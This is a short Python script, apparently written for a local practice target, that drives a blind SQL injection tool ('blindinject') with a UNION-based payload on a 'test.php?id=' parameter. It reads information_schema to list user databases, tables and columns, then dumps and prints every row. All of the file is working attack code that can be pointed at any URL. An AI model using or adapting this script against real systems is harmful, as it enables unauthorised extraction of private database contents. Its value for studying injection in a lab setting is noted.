#!/usr/bin/python

import blindinject

''' SQLInjector parameters & callbacks '''

cols = ['TABLE_SCHEMA', 'TABLE_NAME', 'COLUMN_NAME', 'ORDINAL_POSITION']
addWhere = '`TABLE_SCHEMA` != \'mysql\' AND `TABLE_SCHEMA`!=\'information_schema\' AND `TABLE_SCHEMA`!=\'performance_schema\''

def patternCB(res):
	return res.find('Sorry, no result')==-1

def simpleURLencode(url):
	return url.replace(' ', '%20').replace('#', '%23')


''' CODE '''

SI = blindinject.SQLInjector('http://localhost/blind/test.php?id=', '0\' UNION ', '#', '', patternCB, simpleURLencode)
BBlist = blindinject.BlindBuild(SI, 2, 'information_schema', 'COLUMNS', cols, addWhere, True)

dumplist = BBlist.run()

databases = dict()

for line in dumplist:

	dbname = line['TABLE_SCHEMA']
	if not dbname in databases.keys():
		databases[dbname] = dict()
	
	tablename = line['TABLE_NAME']
	if not tablename in databases[dbname].keys():
		databases[dbname][tablename] = dict()

	columnname = line['COLUMN_NAME']
	databases[dbname][tablename][columnname] = {'position':line['ORDINAL_POSITION']}

for (dbname, db) in databases.items():
	print 'Database '+dbname

	for (tablename, table) in db.items():
		print '\tTable '+tablename

		BBTable = blindinject.BlindBuild(SI, 2, dbname, tablename, table.keys())
		
		for line in BBTable.run():
			for col in table.keys():
				print '\t\t'+col+' = '+line[col]
			print '\t\t------------'

print 'Number of requests :'+str(SI.numreq)
